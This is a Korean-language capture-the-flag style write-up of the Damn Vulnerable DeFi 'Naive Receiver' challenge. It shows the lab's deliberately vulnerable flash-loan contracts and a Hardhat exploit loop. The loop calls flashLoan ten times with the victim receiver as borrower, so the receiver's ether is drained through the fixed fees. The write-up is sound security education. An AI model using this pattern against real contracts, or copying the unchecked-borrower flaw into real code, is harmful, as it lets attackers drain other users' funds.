https://teberr.notion.site/Damn-Vulnerable-Defi-Naive-Receiver-baa785e9db0d446583fd9b9a194e1c98

# 문제 소개

![문제.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/95792b8e-dcd1-4ef4-b25f-4092e9935b2d/%EB%AC%B8%EC%A0%9C.png)

문제 #2 - Naive Receiver

100 이더를 가지고 있는 수수료가 비싼 대출 풀이 있다. 

우리는 이 대출 풀에서 대출 받고 갚는 상호작용이 가능한 10이더를 가지고 있는 유저 컨트랙트를 발견했다. 이 유저 컨트랙트에 존재하는 이더를 전부 없애보자.

# 코드 분석 및 공격 설계

## FlashLoanReceiver.sol

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FlashLoanReceiver {
    using Address for address payable;

    address payable private pool;

    constructor(address payable poolAddress) {
        pool = poolAddress;
    }

    // Function called by the pool during flash loan
    function receiveEther(uint256 fee) public payable {
        require(msg.sender == pool, "Sender must be pool");

        uint256 amountToBeRepaid = msg.value + fee;

        require(address(this).balance >= amountToBeRepaid, "Cannot borrow that much");
        
        _executeActionDuringFlashLoan();
        
        // Return funds to pool
        pool.sendValue(amountToBeRepaid);
    }

    // Internal function where the funds received are used
    function _executeActionDuringFlashLoan() internal { }

    // Allow deposits of ETH
    receive () external payable {}
}
```

FlashLoanReceiver는 대출 풀에서 대출을 받는 ‘유저 컨트랙트’이며 생성자와 세개의 함수가 존재한다.

1. constructor(생성자)
2. receiveEther (핵심 함수)
3. _executeActionDuringFlashLoan
4. receive 함수

constructor는 이용할 대출 서비스의 주소를 고정으로 설정해 놓는다. 따라서 이 유저 컨트랙트는 NaiveReceiverLenderPool의 대출 서비스만 이용할 수 있도록 고정되어 있다고 추측된다.

receiveEther 함수로 대출 풀에서 이더를 대출 받고 대출받은 이더를 통해 어떤 행위를 한 뒤 빌린 원금에 수수료 까지 붙여서 다시 대출을 갚는 이 컨트랙트에서의 핵심적인 함수이다. 

_executeActionDuringFlashLoan 함수는 대출받고 나서 유저 컨트랙트에서 대출 받은 이더로 어떤 행동을 한다는 것을 의미할 뿐 실제로 구현 된 것은 없으므로 ‘의미상 대출받고 작업 수행’으로 이해하면 된다. 

receive 함수가 존재하므로 이 컨트랙트는 이더를 받을 수 있는 컨트랙트이다. (없으면 이더를 받을 수 없음 , Ethernaut의 Force 문제 참고)

# NaiveReceiverLenderPool.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract NaiveReceiverLenderPool is ReentrancyGuard {

    using Address for address;

    uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan

    function fixedFee() external pure returns (uint256) {
        return FIXED_FEE;
    }

    function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant {

        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= borrowAmount, "Not enough ETH in pool");

        require(borrower.isContract(), "Borrower must be a deployed contract");
        // Transfer ETH and handle control to receiver
        // 컨트랙트주소.call(abi.encodeWithSignature(”함수이름(파라미터 자료형)”,값)
        borrower.functionCallWithValue(
            abi.encodeWithSignature(
                "receiveEther(uint256)",
                FIXED_FEE
            ),
            borrowAmount
        );
        
        require(
            address(this).balance >= balanceBefore + FIXED_FEE,
            "Flash loan hasn't been paid back"
        );
    }

    // Allow deposits of ETH
    receive () external payable {}
}
```

NaiveReceiverLenderPool은 대출 풀을 제공하는 컨트랙트이며 다음과 같이 이루어져있다.

1. 수수료는 1이더로 되어있다.
2. flashLoan 함수 (핵심 함수)
3. receive 함수

수수료는 1이더로 상수 값이고 receive 함수 또한 컨트랙트가 이더를 받을 수 있는 것일 뿐 특별한 용도는 없기에 핵심 함수인 flashLoan 함수를 자세히 살펴보자.

```solidity
 function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant {

        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= borrowAmount, "Not enough ETH in pool");

        require(borrower.isContract(), "Borrower must be a deployed contract");
        // Transfer ETH and handle control to receiver
        // 컨트랙트주소.call(abi.encodeWithSignature(”함수이름(파라미터 자료형)”,값)
        borrower.functionCallWithValue(
            abi.encodeWithSignature(
                "receiveEther(uint256)",
                FIXED_FEE
            ),
            borrowAmount
        );
        
        require(
            address(this).balance >= balanceBefore + FIXED_FEE,
            "Flash loan hasn't been paid back"
        );
    }
```

다음과 같은 과정으로 작동한다.

1. 이 컨트랙트가 가진 자산 (100이더)를 balanceBefore에 저장
2. 대출 하려는 양은 이 컨트랙트가 가진 자산보다 작아야함
3. 빌리려는 자(borrower)는 컨트랙트 여야함.
4. borrower의 receiveEther 함수를 수수료 fee를 1이더로 하여 borrowAmount(빌리려는 양) 만큼 이더를 보내며 실행시킴 
5. 이 컨트랙트의 자산이(대출이 상환되었으므로) 빌려주기전 + 수수료보다 높아야 함.

얼핏 보기에는 문제가 없어보이지만 문제는 borrower가 컨트랙트를 호출하는 msg.sender가 아닌 우리가 임의의 주소로 정하여 flashLoan 함수를 실행시킬 수 있다는 것이 문제다.

즉 유저 컨트랙트의 주소를 borrower로 하여 전달하면 유저 컨트랙트는 receiveEther가 실행되면서 유저 컨트랙트에 있는 1이더를 수수료로 대출 풀에 갚게 된다. 

즉 borrower로 유저 컨트랙트 주소를 설정하여 flashLoan 함수를 10번 실행시키게 되면 유저 컨트랙트는 수수료 1이더씩 총 10번 내게되면서 이더를 전부 상납하게 된다.

# 공격

test 폴더의 naive-receiver.challenge.js 파일을 통해서 공격이 성공하는지 테스트하자

```tsx
const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Naive receiver', function () {
    let deployer, user, attacker;

    // Pool has 1000 ETH in balance
    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    // Receiver has 10 ETH in balance
    const ETHER_IN_RECEIVER = ethers.utils.parseEther('10');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, user, attacker] = await ethers.getSigners();

        const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
        const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);

        this.pool = await LenderPoolFactory.deploy();
        await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });
        
        expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(ETHER_IN_POOL);
        expect(await this.pool.fixedFee()).to.be.equal(ethers.utils.parseEther('1'));

        this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
        await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
        
        expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
    });

    it('Exploit', async function () {
				for(let i=0;i<10;i++){
            await this.pool.flashLoan(this.receiver.address,1);
        }
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // All ETH has been drained from the receiver
        expect(
            await ethers.provider.getBalance(this.receiver.address)
        ).to.be.equal('0');
        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal(ETHER_IN_POOL.add(ETHER_IN_RECEIVER));
    });
});
```

이 때 this.pool이 deploy된 NaiveReceiverLenderPool이고 this.receiver가 deploy된 FlashLoanReceiver(공격대상인 유저 컨트랙트)가 된다. 

```tsx
    it('Exploit', async function () {
				for(let i=0;i<10;i++){
            await this.pool.flashLoan(this.receiver.address,1);
        }
    });
```

즉 this.pool에서 flashLoan을 유저 컨트랙트의 주소인 this.receiver.address로 1이더만큼 빌리게 만들어서 실행시켜주면 된다. 

![공격 성공.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2c6ef2fd-7447-43a7-a8f5-c9eacef7da73/%EA%B3%B5%EA%B2%A9_%EC%84%B1%EA%B3%B5.png)

npm run naive-receiver를 통해 공격이 성공했는지 테스트 결과를 확인해 보면 공격이 정상적으로 성공했음을 확인할 수 있다.
